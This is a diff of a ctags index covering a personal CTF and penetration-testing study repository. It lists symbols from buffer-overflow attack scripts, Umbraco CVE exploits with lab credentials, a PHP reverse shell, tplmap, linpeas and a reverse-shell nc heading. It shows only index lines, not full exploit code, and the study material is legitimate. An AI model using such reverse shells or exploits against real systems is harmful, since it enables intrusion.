+key	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/attack_script_bof3.py	/^key = p32(0x0804849d)$/;"	v
+key_file	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^key_file =$/;"	k	section:external_image_storage.gcs
+key_file	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^key_file =$/;"	k	section:smtp
+landscape	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^landscape:x:103:110::\/var\/lib\/landscape:\/bin\/false$/;"	u	home:/var/lib/landscape	shell:/bin/false
+language	dreamhackctf/login-1/tplmap/plugins/engines/pug.py	/^    language = 'javascript'$/;"	v	class:Pug
+language	dreamhackctf/login-1/tplmap/plugins/languages/java.py	/^    language = 'java'$/;"	v	class:Java
+language	dreamhackctf/login-1/tplmap/plugins/languages/javascript.py	/^    language = 'javascript'$/;"	v	class:Javascript
+language	dreamhackctf/login-1/tplmap/plugins/languages/php.py	/^    language = 'php'$/;"	v	class:Php
+language	dreamhackctf/login-1/tplmap/plugins/languages/python.py	/^    language = 'python'$/;"	v	class:Python
+language	dreamhackctf/login-1/tplmap/plugins/languages/ruby.py	/^    language = 'ruby'$/;"	v	class:Ruby
+language_init	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def language_init(self):$/;"	m	class:Plugin
+language_init	dreamhackctf/login-1/tplmap/plugins/languages/java.py	/^    def language_init(self):$/;"	m	class:Java
+language_init	dreamhackctf/login-1/tplmap/plugins/languages/javascript.py	/^    def language_init(self):$/;"	m	class:Javascript
+language_init	dreamhackctf/login-1/tplmap/plugins/languages/php.py	/^    def language_init(self):$/;"	m	class:Php
+language_init	dreamhackctf/login-1/tplmap/plugins/languages/python.py	/^    def language_init(self):$/;"	m	class:Python
+language_init	dreamhackctf/login-1/tplmap/plugins/languages/ruby.py	/^    def language_init(self):$/;"	m	class:Ruby
+ldap_sync_ttl	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^ldap_sync_ttl = 60$/;"	k	section:auth.proxy
+level	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^level = info$/;"	k	section:log
+level	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^level =$/;"	k	section:log.console
+level	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^level =$/;"	k	section:log.file
+level	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^level =$/;"	k	section:log.syslog
+libc_base	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^libc_base = __libc_start_main_addr - __libc_start_main_rel$/;"	v
+libuuid	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^libuuid:x:100:101::\/var\/lib\/libuuid:\/bin\/sh$/;"	u	home:/var/lib/libuuid	shell:/bin/sh
+license_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^license_path =$/;"	k	section:enterprise
+limited	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def limited(engine):$/;"	f
+list	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^list:x:38:38:Mailing List Manager:\/var\/list:\/bin\/sh$/;"	u	home:/var/list	shell:/bin/sh
+listOfFiles	thm/Advent_of_Cyber/Day16/extract_all_zip.py	/^listOfFiles = os.listdir(".\/")$/;"	v
+loader	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^$loader = new Twig_Loader_Array(array($/;"	v
+loader	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^$loader = new Twig_Loader_Array(array($/;"	v
+log	dreamhackctf/login-1/tplmap/utils/loggers.py	/^log = None$/;"	v
+log	dreamhackctf/login-1/tplmap/utils/loggers.py	/^log = logging.getLogger('log')$/;"	v
+log	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[log]$/;"	s
+log.console	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[log.console]$/;"	s
+log.file	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[log.file]$/;"	s
+log.syslog	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[log.syslog]$/;"	s
+log_path	dreamhackctf/login-1/tplmap/utils/loggers.py	/^log_path = os.path.join(utils.config.base_path, 'tplmap.log')$/;"	v
+log_queries	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^log_queries =$/;"	k	section:database
+log_response	dreamhackctf/login-1/tplmap/utils/config.py	/^log_response = config["log_response"]$/;"	v
+log_rotate	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^log_rotate = true$/;"	k	section:log.file
+logfile	dreamhackctf/login-1/tplmap/utils/loggers.py	/^logfile = None$/;"	v
+logging	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^logging = false$/;"	k	section:dataproxy
+login	dreamhackctf/cookie/app.py	/^def login():$/;"	f
+login	dreamhackctf/login-1/app.py	/^def login():$/;"	f
+login	dreamhackctf/simple_sqli/app.py	/^def login():$/;"	f
+login	htb/Remote/Gaining/umbraco_cve1.py	/^login = "admin@htb.local";$/;"	v
+login	htb/Remote/Gaining/umbraco_cve2.py	/^login = "admin@htb.local";$/;"	v
+login	htb/Remote/Gaining/umbraco_cve3.py	/^login = "admin@htb.local";$/;"	v
+login_cookie_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^login_cookie_name = grafana_session$/;"	k	section:auth
+login_hint	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^login_hint = email or username$/;"	k	section:users
+login_maximum_inactive_lifetime_days	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^login_maximum_inactive_lifetime_days = 7$/;"	k	section:auth
+login_maximum_lifetime_days	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^login_maximum_lifetime_days = 30$/;"	k	section:auth
+loginfo	htb/Remote/Gaining/umbraco_cve1.py	/^loginfo = {"username":login,"password":password};$/;"	v
+loginfo	htb/Remote/Gaining/umbraco_cve2.py	/^loginfo = {"username":login,"password":password};$/;"	v
+loginfo	htb/Remote/Gaining/umbraco_cve3.py	/^loginfo = {"username":login,"password":password};$/;"	v
+logout	dreamhackctf/login-1/app.py	/^def logout():$/;"	f
+logs	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^logs = data\/log$/;"	k	section:paths
+lp	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^lp:x:7:7:lp:\/var\/spool\/lpd:\/bin\/sh$/;"	u	home:/var/spool/lpd	shell:/bin/sh
 macOS Reverse Shell nc command	thm/LFI_inclusiton_box/README.md	/^# macOS Reverse Shell nc command$/;"	c
-macport samba installation command about samba :	thm/Basic_Pentesting/README.md	/^## macport samba installation command about samba :$/;"	s	chapter:Samba installation in mac ( my way)
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example.c	/^int main() {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example01.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example02.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example03.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example04.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example04_1.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_test_dir/test_example01.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_test_dir/test_example02.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/find_shell_string.c	/^int main() {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/getaddrenv.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/got_example_dir/got.c	/^int main( int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/got_example_dir/got_example01.c	/^int main() {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/buffer_overflow_example/got_example_dir/got_example02.c	/^int main(void) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/format_string_example/fsb.c	/^int main( int argc, char *argv[]) {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/problem_collectiong/bof.c	/^int main(int argc, char* argv[]){$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/problem_collectiong/bof_test_dir/func_call_anl.c	/^int main() {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/problem_collectiong/bof_test_dir/func_pointer.c	/^int main() {$/;"	f	typeref:typename:int
-main	study_about_hacked/system_tip/test.c	/^int main() {$/;"	f	typeref:typename:int
-secret	study_about_hacked/system_tip/format_string_example/fsb.c	/^int secret = 0x12345678;$/;"	v	typeref:typename:int
-should be installationg macport	thm/Basic_Pentesting/README.md	/^## should be installationg macport$/;"	s	chapter:Samba installation in mac ( my way)
-using in "gobuster"	thm/Basic_Pentesting/README.md	/^# using in "gobuster"$/;"	c
-write the : /opt/local/etc/samba3/samba.conf	thm/Basic_Pentesting/README.md	/^## write the : \/opt\/local\/etc\/samba3\/samba.conf$/;"	s	chapter:Samba installation in mac ( my way)
+mail	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^mail:x:8:8:mail:\/var\/mail:\/bin\/sh$/;"	u	home:/var/mail	shell:/bin/sh
+main	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/src/main/java/org/tplmap/webframeworks/SparkApplication.java	/^public static void main(String[] args) {$/;"	m	class:SparkApplication
+main	dreamhackctf/login-1/tplmap/tplmap.py	/^def main():$/;"	f
+main	study_hacked/system_tip/book4b_pwn/step3/bof.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step3/format.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step4/fsb/fsb.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step4/fsb/got.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof1/bof1.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/bof2.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/bof3.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/book4b_pwn/step5/aslr/bof4.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example.c	/^int main() {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example01.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example02.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example03.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example04.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example04_1.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_test_dir/test_example01.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_test_dir/test_example02.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/find_shell_string.c	/^int main() {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/getaddrenv.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/got_example_dir/got.c	/^int main( int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/got_example_dir/got_example01.c	/^int main() {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/buffer_overflow_example/got_example_dir/got_example02.c	/^int main(void) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/format_string_example/fsb.c	/^int main( int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/problem_collectiong/bof_test_dir/func_call_anl.c	/^int main() {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/problem_collectiong/bof_test_dir/func_pointer.c	/^int main() {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/problem_collectiong/problem01.c	/^int main(int argc, char* argv[]){$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/pwntools_usage/auto_overflow.c	/^int main(int argc, char *argv[]) {$/;"	f	typeref:typename:int
+main	study_hacked/system_tip/test.c	/^int main() {$/;"	f	typeref:typename:int
+main	thm/Advent_of_Cyber/Day22/if1.c	/^int main(void){$/;"	f	typeref:typename:int
+main	thm/Advent_of_Cyber/Day7/17942.c	/^int main(int argc,char *argv[], char ** envp)$/;"	f	typeref:typename:int
+makeBackupcode	dreamhackctf/login-1/app.py	/^def makeBackupcode():$/;"	f
+man	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^man:x:6:12:man:\/var\/cache\/man:\/bin\/sh$/;"	u	home:/var/cache/man	shell:/bin/sh
+marko	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var marko=require('marko');$/;"	v
+max_attempts	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_attempts = 3$/;"	k	section:alerting
+max_days	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_days = 7$/;"	k	section:log.file
+max_idle_conn	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_idle_conn = 2$/;"	k	section:database
+max_issue_delay	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_issue_delay = 90s$/;"	k	section:auth.saml
+max_lines	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_lines = 1000000$/;"	k	section:log.file
+max_open_conn	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_open_conn =$/;"	k	section:database
+max_size_shift	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^max_size_shift = 28$/;"	k	section:log.file
+md5	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def md5(self, remote_path):$/;"	m	class:Plugin
+md5	dreamhackctf/login-1/tplmap/utils/strings.py	/^def md5(data):$/;"	f
+metadata	thm/Advent_of_Cyber/Day16/extract_all/showingTheMetaData.py	/^	metadata = et.get_metadata_batch(files)$/;"	v
+metadata_valid_duration	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^metadata_valid_duration = 48h$/;"	k	section:auth.saml
+metrics	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[metrics]$/;"	s
+metrics.graphite	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[metrics.graphite]$/;"	s
+min_interval_seconds	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^min_interval_seconds = 1$/;"	k	section:alerting
+mode	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^mode = console file$/;"	k	section:log
+msg	thm/Advent_of_Cyber/Day6/decodeAnyencode.py	/^msg = str(input("[+] INPUT the Any Text : "))$/;"	v
+mylookup	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^mylookup = TemplateLookup(directories=['\/tpl'])$/;"	v
+mysql	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^mysql:x:104:114:MySQL Server,,,:\/var\/lib\/mysql:\/bin\/false$/;"	u	home:/var/lib/mysql	shell:/bin/false
+name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^name = OAuth$/;"	k	section:auth.generic_oauth
+name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^name = grafana$/;"	k	section:database
+network	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^network =$/;"	k	section:log.syslog
+new_cookie	dreamhackctf/login-1/test.py	/^        new_cookie = encode(secret_key,payload)$/;"	v
+news	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^news:x:9:9:news:\/var\/spool\/news:\/bin\/sh$/;"	u	home:/var/spool/news	shell:/bin/sh
+nobody	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^nobody:x:65534:65534:nobody:\/nonexistent:\/bin\/sh$/;"	u	home:/nonexistent	shell:/bin/sh
+nodata_or_nullvalues	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^nodata_or_nullvalues = no_data$/;"	k	section:alerting
+notification_timeout_seconds	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^notification_timeout_seconds = 30$/;"	k	section:alerting
+num_changed_sockets	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);$/;"	v
+nunjucks	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var nunjucks = require('nunjucks');$/;"	v
+oauth_auto_login	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^oauth_auto_login = false$/;"	k	section:auth
+option	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^option = parser.get_option("-h")$/;"	v
+options	thm/Simple_CTF/46635.py	/^options, args = parser.parse_args()$/;"	v
+options	thm/Simple_CTF/46635.py.bak	/^options, args = parser.parse_args()$/;"	v
+org.tplmap.webframeworks	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/src/main/java/org/tplmap/webframeworks/SparkApplication.java	/^package org.tplmap.webframeworks;$/;"	p
+org_api_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^org_api_key = 10$/;"	k	section:quota
+org_dashboard	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^org_dashboard = 100$/;"	k	section:quota
+org_data_source	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^org_data_source = 10$/;"	k	section:quota
+org_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^org_name = DH{THIS_IS_FAKE_FLAG}$/;"	k	section:auth.anonymous
+org_role	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^org_role = Viewer$/;"	k	section:auth.anonymous
+org_user	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^org_user = 10$/;"	k	section:quota
+oscmd	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^oscmd = OptionGroup(parser, "Operating system access", "These "$/;"	v
+output	thm/Simple_CTF/46635.py	/^output = ""$/;"	v
+output	thm/Simple_CTF/46635.py.bak	/^output = ""$/;"	v
+p	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/attack_script_bof3.py	/^	p = process('.\/bof3')$/;"	v
+p	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^def p(x):$/;"	f
+p	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^def p(x):$/;"	f
+p	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^def p(x):$/;"	f
+panels	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[panels]$/;"	s
+parser	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^parser = MyParser(usage=usage, epilog=epilog)$/;"	v
+parser	thm/Simple_CTF/46635.py	/^parser = optparse.OptionParser()$/;"	v
+parser	thm/Simple_CTF/46635.py.bak	/^parser = optparse.OptionParser()$/;"	v
+password	dreamhackctf/login-1/request_.py	/^password =  ' -- '$/;"	v
+password	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^password =$/;"	k	section:database
+password	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^password =$/;"	k	section:external_image_storage.webdav
+password	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^password =$/;"	k	section:smtp
+password	htb/Remote/Gaining/umbraco_cve1.py	/^password="baconandcheese";$/;"	v
+password	htb/Remote/Gaining/umbraco_cve2.py	/^password="baconandcheese";$/;"	v
+password	htb/Remote/Gaining/umbraco_cve3.py	/^password="baconandcheese";$/;"	v
+password	thm/Simple_CTF/46635.py	/^password = ""$/;"	v
+password	thm/Simple_CTF/46635.py.bak	/^password = ""$/;"	v
+password_hint	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^password_hint = password$/;"	k	section:users
+path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^path = grafana.db$/;"	k	section:database
+path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^path =$/;"	k	section:external_image_storage.gcs
+path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^path =$/;"	k	section:external_image_storage.s3
+path_style_access	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^path_style_access =$/;"	k	section:external_image_storage.s3
+paths	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[paths]$/;"	s
+payload	dreamhackctf/login-1/test.py	/^payload = {"idx":1,"level":"admin","name":"Apple","userid":"Apple"}$/;"	v
+payload	htb/Remote/Gaining/umbraco_cve1.py	/^payload = """<?xml version="1.0"?>$/;"	v
+payload	htb/Remote/Gaining/umbraco_cve2.py	/^payload = """<?xml version="1.0"?>$/;"	v
+payload	htb/Remote/Gaining/umbraco_cve3.py	/^payload = """<?xml version="1.0"?>$/;"	v
+payload	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/attack_script_pwntool.py	/^	payload = 'A'*i + key$/;"	v
+payload	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/attack_script_bof3.py	/^	payload = "a"*i + key$/;"	v
+payload	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^payload = b'A' * 51$/;"	v
+payload	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^payload = 'A' * 51$/;"	v
+payload	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^payload = b''.join([$/;"	v
+pid	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^	$pid = pcntl_fork();$/;"	v
+plugin	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    plugin = Freemarker$/;"	v	class:FreemarkerTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    plugin = Velocity$/;"	v	class:VelocityTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    plugin = Dot$/;"	v	class:DotTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    plugin = Dust$/;"	v	class:DustTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    plugin = Ejs$/;"	v	class:EjsTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    plugin = Javascript$/;"	v	class:JavascriptTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    plugin = Marko$/;"	v	class:MarkoTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    plugin = Nunjucks$/;"	v	class:NunjucksTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    plugin = Pug$/;"	v	class:PugTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    plugin = Php$/;"	v	class:PhpTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    plugin = Smarty$/;"	v	class:SmartySecuredTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    plugin = Smarty$/;"	v	class:SmartyUnsecuredTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    plugin = Twig$/;"	v	class:TwigSecuredTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    plugin = Twig$/;"	v	class:TwigUnsecuredTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    plugin = Jinja2$/;"	v	class:Jinja2Test
+plugin	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    plugin = Mako$/;"	v	class:MakoTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    plugin = Python$/;"	v	class:PythonTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    plugin = Tornado$/;"	v	class:TornadoTest
+plugin	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    plugin = Erb$/;"	v	class:ErbTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    plugin = Ruby$/;"	v	class:RubyTests
+plugin	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    plugin = Slim$/;"	v	class:SlimTests
+plugins	dreamhackctf/login-1/tplmap/core/checks.py	/^plugins = [$/;"	v
+plugins	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[plugins]$/;"	s
+plugins	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^plugins = data\/plugins$/;"	k	section:paths
+pop3ret	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^pop3ret = 0x804854d$/;"	v
+port	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$port = 1234;       \/\/ CHANGE THIS$/;"	v
+postcmd	dreamhackctf/login-1/tplmap/core/clis.py	/^    def postcmd(self, stop, line):$/;"	m	class:MultilineShell
+postfunc	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def postfunc(engine):$/;"	f
+prefix	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^prefix = prod.grafana.%(instance_name)s.$/;"	k	section:metrics.graphite
+prep_to_find	thm/The_Cod_Caper/linpeas.sh	/^  prep_to_find() {$/;"	f
+print_banner	thm/The_Cod_Caper/linpeas.sh	/^print_banner(){$/;"	f
+print_dict	htb/Remote/Gaining/umbraco_cve1.py	/^def print_dict(dico):$/;"	f
+print_dict	htb/Remote/Gaining/umbraco_cve2.py	/^def print_dict(dico):$/;"	f
+print_dict	htb/Remote/Gaining/umbraco_cve3.py	/^def print_dict(dico):$/;"	f
+print_ps	thm/The_Cod_Caper/linpeas.sh	/^print_ps (){$/;"	f
+printit	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^function printit ($string) {$/;"	f
+private_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^private_key =$/;"	k	section:auth.saml
+private_key_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^private_key_path =$/;"	k	section:auth.saml
+process	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$process = proc_open($shell, $descriptorspec, $pipes);$/;"	v
+protocol	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^protocol = http$/;"	k	section:server
+provider	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^provider =$/;"	k	section:external_image_storage
+provisioning	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^provisioning = conf\/provisioning$/;"	k	section:paths
+proxy	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^proxy:x:13:13:proxy:\/bin:\/bin\/sh$/;"	u	home:/bin	shell:/bin/sh
+public_mode	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^public_mode = false$/;"	k	section:snapshots
+public_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^public_url =$/;"	k	section:external_image_storage.webdav
+pug	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var pug = require('pug');$/;"	v
+putfunc	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def putfunc(engine):$/;"	f
+query_db	dreamhackctf/simple_sqli/app.py	/^def query_db(query, one=True):$/;"	f
+quota	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[quota]$/;"	s
+quote	dreamhackctf/login-1/tplmap/utils/strings.py	/^def quote(command):$/;"	f
+r	dreamhackctf/login-1/curlRequest.py	/^		r = r.text$/;"	v
+r	dreamhackctf/login-1/curlRequest.py	/^		r = requests.get(url)$/;"	v
+r	dreamhackctf/login-1/test.py	/^        r = requests.get(url+"login", cookies={"session":new_cookie})$/;"	v
+r	thm/Advent_of_Cyber/Day9/Day9RequestScript.py	/^	r = requests.get(reqUrl,headers=value)$/;"	v
+r1	htb/Remote/Gaining/umbraco_cve1.py	/^r1 = s.get(url_main);$/;"	v
+r1	htb/Remote/Gaining/umbraco_cve2.py	/^r1 = s.get(url_main);$/;"	v
+r1	htb/Remote/Gaining/umbraco_cve3.py	/^r1 = s.get(url_main);$/;"	v
+r2	htb/Remote/Gaining/umbraco_cve1.py	/^r2 = s.post(url_login,json=loginfo);$/;"	v
+r2	htb/Remote/Gaining/umbraco_cve2.py	/^r2 = s.post(url_login,json=loginfo);$/;"	v
+r2	htb/Remote/Gaining/umbraco_cve3.py	/^r2 = s.post(url_login,json=loginfo);$/;"	v
+r3	htb/Remote/Gaining/umbraco_cve1.py	/^r3 = s.get(url_xslt);$/;"	v
+r3	htb/Remote/Gaining/umbraco_cve2.py	/^r3 = s.get(url_xslt);$/;"	v
+r3	htb/Remote/Gaining/umbraco_cve3.py	/^r3 = s.get(url_xslt);$/;"	v
+r4	htb/Remote/Gaining/umbraco_cve1.py	/^r4 = s.post(url_xslt,data=data,headers=headers);$/;"	v
+r4	htb/Remote/Gaining/umbraco_cve2.py	/^r4 = s.post(url_xslt,data=data,headers=headers);$/;"	v
